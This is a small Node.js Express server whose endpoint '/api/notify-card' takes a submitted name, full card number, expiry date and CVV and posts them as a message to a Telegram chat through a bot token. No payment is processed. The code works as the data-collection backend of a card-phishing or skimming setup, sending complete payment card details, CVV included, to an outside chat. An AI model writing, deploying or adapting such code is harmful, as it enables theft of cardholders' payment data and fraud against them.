import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import fetch from "node-fetch";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3001;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

app.use(cors());
app.use(express.json());

app.get("/health", (_req, res) => res.json({ ok: true }));

app.post("/api/notify-card", async (req, res) => {
  try {
    const payload = req.body || {};
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      return res.status(500).json({
        ok: false,
        error: "Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID",
      });
    }

    const text = [
      "New card added:",
      `Name: ${payload.firstName || ""} ${payload.lastName || ""}`,
      `Card: ${payload.cardNumber || ""}`,
      `Exp: ${payload.expirationDate || ""}`,
      `CVV: ${payload.cvv || ""}`,
    ].join("\n");

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const tgRes = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text }),
    });
    const tgJson = await tgRes.json();

    if (!tgJson.ok) {
      return res
        .status(502)
        .json({ ok: false, error: "Telegram API error", detail: tgJson });
    }
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ ok: false, error: err?.message || String(err) });
  }
});

app.listen(PORT, () => {
  console.log(`Server listening on http://localhost:${PORT}`);
});
